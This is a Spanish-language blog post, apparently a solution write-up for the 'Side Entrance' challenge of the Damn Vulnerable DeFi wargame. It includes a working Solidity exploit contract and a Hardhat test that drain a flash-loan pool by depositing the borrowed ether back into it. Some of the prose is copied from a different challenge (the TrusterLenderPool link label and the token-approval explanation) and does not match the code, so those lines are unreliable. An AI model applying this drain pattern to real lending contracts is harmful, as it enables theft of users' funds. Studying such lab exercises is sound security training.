{"metadata":{"title":"Solucion al challenge .#4 Side Entrance","date":"Jan 30, 2022","excerpt":"Hay un lending pool que da flashloans gratis, el objetivo es drenar el lending pool y hacerte con todo el ETH"},"content":"<h2>El problema</h2>\n<p>El contrato <a href=\"https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/side-entrance/SideEntranceLenderPool.sol\">TrusterLenderPool.sol</a> tiene un error de logica clave que permite drenar los fondos.</p>\n<p>El error esta en que podemos pedir prestado por un flash loan y utilizar el ether prestado para llamar a la funcion deposit, redepositando dinero y terminando con mas saldo a favor que el inicial.</p>\n<h2>El exploit</h2>\n<p>Bastante simple, solo hay que hacer que el contrato apruebe al atacante para hacer uso de sus tokens.</p>\n<pre><code class=\"hljs language-scss\">contract SideEntranceExploit {\n    <span class=\"hljs-selector-tag\">address</span> pool;\n    function <span class=\"hljs-built_in\">flashLoan</span>(address pool_) external {\n        pool = pool_;\n        <span class=\"hljs-built_in\">ISideEntranceLenderPool</span>(pool)<span class=\"hljs-selector-class\">.flashLoan</span>(pool.balance);\n        <span class=\"hljs-built_in\">ISideEntranceLenderPool</span>(pool)<span class=\"hljs-selector-class\">.withdraw</span>();\n        <span class=\"hljs-built_in\">payable</span>(msg.sender)<span class=\"hljs-selector-class\">.call</span>{value:address(this).balance}(\"\");\n    }\n\n    function <span class=\"hljs-built_in\">execute</span>() external payable {\n        <span class=\"hljs-built_in\">ISideEntranceLenderPool</span>(pool)<span class=\"hljs-selector-class\">.deposit</span>{value: msg.value}();    \n    }\n\n    <span class=\"hljs-built_in\">receive</span>() external payable {}\n}\n</code></pre>\n<pre><code class=\"hljs language-js\">    <span class=\"hljs-title hljs-function\">it</span>(<span class=\"hljs-string\">'Exploit'</span>, <span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) {\n        <span class=\"hljs-keyword\">const</span> <span class=\"hljs-title hljs-class\">SideEntranceExploit</span> = <span class=\"hljs-keyword\">await</span> ethers.<span class=\"hljs-title hljs-function\">getContractFactory</span>(<span class=\"hljs-string\">'SideEntranceExploit'</span>, attacker);\n        <span class=\"hljs-keyword\">const</span> sideEntranceExploit = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title hljs-class\">SideEntranceExploit</span>.<span class=\"hljs-title hljs-function\">deploy</span>();\n        <span class=\"hljs-keyword\">await</span> sideEntranceExploit.<span class=\"hljs-title hljs-function\">flashLoan</span>(<span class=\"hljs-variable hljs-language\">this</span>.<span class=\"hljs-property\">pool</span>.<span class=\"hljs-property\">address</span>);\n    });\n</code></pre>"}